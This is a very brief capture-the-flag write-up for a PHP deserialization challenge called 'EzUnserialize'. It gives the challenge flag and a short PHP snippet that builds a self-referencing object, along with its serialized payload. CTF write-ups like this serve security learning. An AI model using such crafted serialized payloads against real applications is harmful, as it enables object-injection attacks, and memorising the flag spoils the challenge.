## EzUnserialize

`tjctf{b39f3947-b8c3-4d4f-9a26-6ca80986b9c2}`

### writeup

```php 
<?php
$a = new stdclass();
$a->d=&$a->c;
echo serialize($a);
?>
// O:8:"stdClass":2:{s:1:"c";N;s:1:"d";R:2;}
```
